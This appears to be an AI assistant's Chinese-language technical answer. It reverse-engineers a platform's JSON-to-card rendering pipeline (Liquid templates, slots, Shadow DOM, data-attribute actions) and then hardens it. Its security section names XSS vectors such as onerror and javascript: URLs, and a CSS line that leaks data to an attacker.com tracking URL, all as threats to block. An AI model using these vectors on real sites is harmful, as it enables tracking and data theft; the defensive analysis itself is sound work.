---
date: 2026-01-13
tags:
---
我会先把文档里的“JSON 美化”拆成一条完整渲染链路（解析→匹配模板→Liquid 渲染→样式注入→插槽拼装→交互指令），再给你一份可落地的实现架构/伪代码、数据结构、以及需要重点防护的安全面与加固方案。

下面我按“逆向工程”的方式，把你这份文档里 **JSON 美化** 背后的实现拆成一条可落地的渲染链路：**协议 → 解析 → 模板匹配 → 模板渲染 → 插槽拼装 → 样式隔离 → 交互指令 → 安全加固**。最后会给你一套你自己的平台可复用的架构与关键伪代码/数据结构，以及这类方案的主要安全风险点与防护策略。

---

## 1) 这套 JSON 美化本质是什么

从文档描述看，PVESO 的 JSON 美化不是“把 JSON 展示出来”，而是建立了一种 **“AI 输出结构化协议(JSON)，前端按 type 选择模板渲染 UI”** 的机制：

- **AI 侧负责：** 输出 `{"type":"xxx", ...fields}` 这样的结构化数据（尽量稳定、少跑偏）。
    
- **平台侧负责：** 为每个 `type` 预先配置好一个模板 `{ type, style, html }`：
    
    - `style`：这张卡的 CSS
        
    - `html`：用 LiquidJS 写的模板（`{{title}}` 等插值）
        
- **渲染器：** 解析消息里的 JSON 块 → 找到模板 → 用 Liquid 渲染 html → 注入 style → 输出安全 UI（不允许 JS）。
    

这就解释了它宣称的优势：  
比正则稳（不靠脆弱字符串匹配），比纯 Markdown 更强（能做复杂卡片），又比“允许 JS”安全（无脚本）。

---

## 2) “逆向”还原：渲染链路大概率长这样

### 2.1 消息预处理：从 Markdown 中提取 JSON 块

文档反复强调“开场白里的 JSON 必须用 `json` 包裹并换行”，我推测它在 Markdown 解析前/后做了一个提取器，专门识别这类块：

**可能的识别方式：**

- 识别 fenced code block：`json …`
    
- 或识别 info string 特殊写法：```json （后面带空格的自定义标记）
    
- 或识别更“强约束”的写法（比如块首行是 `json` 关键字）
    

**提取结果：**

- `jsonBlocks: Array<object>`：每个块 parse 成对象
    
- `markdownBody: string`：把这些 JSON 块从原 Markdown 中移除（避免用户看到原 JSON）
    

并且会做硬限制（很关键）：

- 单条消息允许的 JSON 块数量上限
    
- 单个 JSON 文本大小上限
    
- JSON parse 失败就当普通文本（或忽略该块）
    

---

### 2.2 模板匹配：用 `type` 找模板

平台维护一个 **Template Registry**：

```ts
type TemplateDef = {
  type: string
  html: string   // Liquid 模板
  style?: string // CSS 文本
  version?: number
}
```

渲染器对每个 JSON 块：

1. 取出 `type`
    
2. registry[type] 找模板
    
3. 找不到：忽略或降级展示（比如当普通 JSON）
    

特殊 type 在文档里已经明确：

- `intro-before` / `intro-after`：无需匹配正文 JSON，属于“固定展示块”
    
- `global-theme`：只注入 style，不渲染 html
    

---

### 2.3 Liquid 渲染：把 JSON 字段填进 HTML

对普通卡片 type：

- `renderedHtml = Liquid.render(template.html, data)`
    
- data 就是 AI 输出 JSON 的字段（缺字段输出空串）
    

这里 PVESO 明确说：

- LiquidJS 沙箱执行（避免任意 JS）
    
- 支持条件/循环/过滤器
    

**你实现时必须加的限制：**

- 最大输出长度（避免模板循环把输出打爆）
    
- 最大循环次数（for 上限）
    
- 渲染超时（防 DoS）
    

> 这一步把“结构化协议”变成“可展示 UI”。

---

### 2.4 插槽与嵌套：`{{slot:child-type}}` 怎么实现

文档的 `{{slot:status-detail}}` **不是标准 Liquid 语法**（Liquid 看到 `{{ ... }}` 会当输出表达式，但 `slot:xxx` 不是合法变量名/表达式），因此 PVESO 很可能做了 **Liquid 之前的自定义预处理**：

**思路 A（最常见也最稳）：把 slot token 替换成占位标签**

- 在渲染前，把模板 html 中的 `{{slot:TYPE}}` 替换成：
    
    - `<pv-slot type="TYPE"></pv-slot>`
        
- Liquid 渲染后，再在 DOM 里把 `<pv-slot>` 替换为对应子卡片的 HTML 片段列表
    

**为什么这样做很合理：**

- 不需要魔改 Liquid 引擎
    
- slot 不会与 Liquid 冲突
    
- DOM 替换比字符串替换安全、可控
    

**拼装策略（文档提到“顺序不固定也能拼装”）：**

- 渲染器先收集本条消息里所有 JSON 块，按 type 分组：
    
    - `map[type] = [renderedNode1, renderedNode2, ...]`
        
- 然后渲染父模板时，在父模板的 `<pv-slot type="child">` 位置插入 `map[child]` 的全部节点（或按规则挑选）
    

> 这就实现了“父模板定义布局，子 JSON 决定内容数量与变体”。

---

### 2.5 样式隔离：为什么提到了 Shadow DOM

文档写了 “Shadow DOM + 加密脚本”，我推测他们：

- 给每条消息/每张卡渲染一个 shadow root
    
- 把 `<style>` 放进 shadow root 内，使 CSS 只影响这张卡（或这条消息容器）
    

这样能解决两类核心问题：

1. 创作者写的 CSS 不至于污染整个页面
    
2. 平台自己的 UI 不容易被卡片 CSS 破坏
    

**这也是你要做“创作者可自定义 CSS”时最关键的工程护城河。**

---

### 2.6 交互指令：无 JS 的“点击行为”怎么做

他们的交互本质上是：__平台预置一套事件处理器 + 用 data-_ 声明式触发_*。

#### 发送指令：`data-action-send`

- 点击元素 → 获取：
    
    - `data-action-send="文本"`：发送该文本
        
    - 没值：发送 element.textContent
        
- `data-auto`：不只是写到输入框，而是直接触发“发送消息”
    

#### 表单提交：`data-action-submit`

- 点击触发器 → 找到所在 `<form>` → 收集所有含 `name` 的控件
    
- 输出一段格式化文本：
    
    - 标题：data-action-submit 的值
        
    - 每行：label/name: value
        
- 同样支持 `data-auto`
    

#### class 操作：add/remove/toggle + target

- 点击触发器 → querySelectorAll(targetSelector) → 操作 classList
    
- 顺序固定：remove → add → toggle
    
- display-hide/show/toggle：本质就是对 `.is-hidden` 类的 add/remove/toggle
    

**实现层面最优雅的是：事件委托（event delegation）**

- 在消息容器（或 shadow root）上监听 click
    
- 从 event.target 向上找最近带 data-* 的元素
    
- 执行对应动作
    

---

## 3) 你在自己项目里怎么落地（推荐架构）

### 3.1 你需要的核心模块

1. **Message JSON Extractor**
    

- 输入：原始 markdown 文本
    
- 输出：`{ cleanMarkdown, jsonObjects[] }`
    

2. **Template Registry**
    

- 存储模板 `{type, html, style, meta...}`
    
- 支持版本、启用/禁用、权限（创作者模板 vs 官方模板）
    
- 支持预览渲染（给创作者即时看效果）
    

3. **Renderer**
    

- Liquid 渲染（受限）
    
- slot 预处理与拼装
    
- HTML/CSS 安全净化（非常关键）
    
- Shadow DOM 挂载
    

4. **Interaction Runtime**
    

- 事件委托执行 data 指令
    
- 限制 selector 作用域（只能在 shadow root 内）
    
- 限制 auto 行为（防“自动发送轰炸”）
    

---

### 3.2 一份足够接近真实工程的伪代码

```ts
function renderMessage(rawMarkdown: string) {
  // 1) 提取 JSON 块
  const { cleanMarkdown, jsonBlocks } = extractJsonBlocks(rawMarkdown)

  // 2) 先渲染 markdown（剩余正文）
  const bodyHtml = renderMarkdownToHtml(cleanMarkdown)
  const safeBodyHtml = sanitizeHtml(bodyHtml)

  // 3) 渲染 JSON 卡片（收集）
  const renderedByType = new Map<string, HTMLElement[]>()
  const globalStyles: string[] = []

  for (const data of jsonBlocks) {
    const type = data.type
    if (!type) continue

    if (type === "global-theme") {
      globalStyles.push(sanitizeCss(String(data.style ?? "")))
      continue
    }

    const tpl = registry.get(type)
    if (!tpl) continue

    // slot token 预处理：把 {{slot:x}} 变成 <pv-slot type="x"></pv-slot>
    const htmlWithSlots = preprocessSlots(tpl.html)

    // Liquid 渲染（带限制）
    const rendered = liquidRenderWithLimits(htmlWithSlots, data)

    // HTML 净化（禁止 script/iframe/on* 等）
    const safeCardHtml = sanitizeHtml(rendered)

    // 生成 DOM 节点（尚未插槽替换）
    const node = htmlToElement(safeCardHtml)

    // 收集 style（放到 shadow root 内）
    const styleText = sanitizeCss(tpl.style ?? "")
    attachStyle(node, styleText)

    if (!renderedByType.has(type)) renderedByType.set(type, [])
    renderedByType.get(type)!.push(node)
  }

  // 4) 进行插槽拼装：把 <pv-slot type="x"> 替换为 renderedByType[x] 的节点
  for (const [type, nodes] of renderedByType) {
    for (const n of nodes) {
      resolveSlots(n, renderedByType) // 只在当前 shadow root 作用域内查找 pv-slot
    }
  }

  // 5) 挂载到消息容器（Shadow DOM）
  return mountToShadowRoot({
    bodyHtml: safeBodyHtml,
    cards: renderedByType,
    globalStyles,
  })
}
```

---

## 4) 这类“创作者自定义 UI”最大的安全问题是什么

你问“是否有安全问题”，答案是：**有，而且主要不在 JSON，而在 HTML/CSS 与交互系统。**  
下面是你必须重点防的面：

---

### 4.1 HTML 注入风险（XSS 的各种变体）

即使禁用了 `<script>`，也仍然可能出现：

- `onerror/onload` 这类事件属性（`<img onerror=...>`）
    
- `href="javascript:..."` / `src="javascript:..."`
    
- SVG 相关（SVG 很容易成为绕过点）
    
- `<iframe> / <object> / <embed>` 外链内容
    
- 表单 action 指向外域（钓鱼/提交隐私）
    

**必须做：HTML Sanitizer（如 DOMPurify）强白名单策略**

- 禁止：script/iframe/object/embed/svg/math 等（svg 建议直接禁或极严控）
    
- 禁止所有 `on*` 属性
    
- 协议白名单：href/src 只允许 `https:`（必要时 `data:image` 但要限大小）
    
- 禁止 `style` 内联（或只允许非常有限的 style 属性）——因为 CSS 风险也很大
    

> PVESO 说“移除 iframe 和 JS 执行”，但如果没做严格净化，依然可能被绕过。

---

### 4.2 CSS 风险（最容易被低估）

CSS 不是“无害的”，它能带来：

**(1) 数据外泄 / 跟踪**

- `background-image: url(https://attacker.com/track?... )`
    
- `@import` 拉外部 css
    
- `@font-face` 拉外部字体
    

**(2) UI 欺骗 / 覆盖**

- `position: fixed; inset:0;` 做全屏遮罩，伪装平台弹窗/登录框
    
- `pointer-events` 控制点击
    
- 把真实内容隐藏，引导用户点“自动发送”
    

**(3) 性能 DoS**

- 超复杂选择器、巨量动画、滤镜、阴影导致卡顿耗电（他们文档也提到“电量消耗快”）
    

**必须做：CSS 解析+过滤**

- 禁止或剥离：`@import`、`url()`、`@font-face`
    
- 限制：animation/filter/blur 等高耗能属性（至少给出总量/长度限制）
    
- 限制选择器只能作用于 shadow root 内（Shadow DOM 已经帮你挡住一大半）
    
- 限制 `position: fixed` / `z-index` 最大值（防覆盖整个页面）
    

> Shadow DOM 能解决“污染全局”，但解决不了“在卡片内部做钓鱼 UI”。

---

### 4.3 Liquid 模板 DoS 风险（循环与输出爆炸）

Liquid 是安全模板语言，但仍可能：

- `for` 循环输出超长
    
- 递归/嵌套结构生成爆量 HTML
    

**必须做：渲染限制**

- 最大渲染时间
    
- 最大输出长度
    
- 最大循环次数/集合长度
    
- 模板编译缓存（避免重复编译消耗）
    

---

### 4.4 交互指令被滥用（“无 JS”不等于无风险）

特别是 `data-auto`：

- 创作者可以做“看起来像普通按钮”，但点击后自动发送大量内容
    
- 或构造“连续触发”的交互误导用户
    

**建议加固：**

- `data-auto` 触发前二次确认（可配置：首次使用某角色/模板时提示）
    
- 每条消息限制 auto 次数（例如 1 次）
    
- 限制单次发送内容长度
    
- 限制指令 target selector 作用域：**只能在当前消息/shadow root 内 querySelector**  
    （否则可能操控页面别的元素）
    

---

### 4.5 “模板加密传输”解决的不是安全问题

文档提到“加密脚本：模板与正则一样经过加密传输，创作者资产更安全”。这更多是 **防抄袭/防直接复制模板** 的“资产保护”手段，不是 Web 安全手段：

- 只要在客户端能渲染，密钥/明文就能被调试拿到
    
- 它不能替代 HTML/CSS Sanitizer
    

你可以做，但要把它定位为“版权/资产保护”，不要当“安全”。

---

## 5) 我给你一套“你项目里最推荐”的实现策略（安全 + 易用平衡）

### 5.1 强烈建议的约束模型（你会省很多事）

**模板能力分级：**

- **Level 1（推荐默认）**：只允许平台提供的“组件语法”（比如 `<Card>`, `<Row>`, `<Badge>` 这类 DSL 或 JSON->组件映射），创作者只调主题变量/布局参数  
    ✅ 最安全、最稳定、最好维护
    
- **Level 2**：允许 HTML 模板（Liquid），但 **HTML 标签白名单 + CSS 白名单 + 禁外链**  
    ✅ 可玩性高但要做净化
    
- **Level 3（不建议）**：完全自由 HTML/CSS  
    ❌ 容易变成钓鱼/覆盖/性能灾难
    

PVESO 看起来属于 Level 2，并通过 Shadow DOM、禁 JS 来控制风险。

---

### 5.2 JSON Schema 校验（提升 AI 输出稳定性）

给每个 type 定义 schema：

- 必填字段、类型、最大长度
    
- 枚举值约束（例如 status 只能是 ok/warn/error）
    
- 数组最大长度（例如 status-detail 最多 3 条）
    

这样你就能做到文档说的“字段可校验、可限制 AI 只更新部分字段”。

---

## 6) 最关键的“逆向结论”

如果用一句话总结 PVESO 的 JSON 美化实现：

> **它把“AI 输出文本”变成“AI 输出协议”，再用受限模板引擎 + Shadow DOM + 声明式 data 指令，在禁用 JS 的前提下实现可交互卡片 UI。**

你完全可以在自己的项目复刻这套模式，且工程上建议优先做：

1. JSON 提取与 schema 校验
    
2. type → 模板 registry
    
3. Liquid 渲染 + slot 拼装
    
4. Shadow DOM 样式隔离
    
5. HTML/CSS 严格净化（这是成败关键）
    
6. data 指令运行时 + 防滥用限制（auto、selector scope、长度限制）
    

---

如果你愿意，我可以直接按你项目技术栈（React/Vue/原生、是否 SSR、编辑器用 Monaco 还是 Codemirror、消息流是否流式输出）给你画一份更贴近实际的模块拆分与接口设计，并附一套“创作者模板编辑器 + 预览沙箱”的实现草图。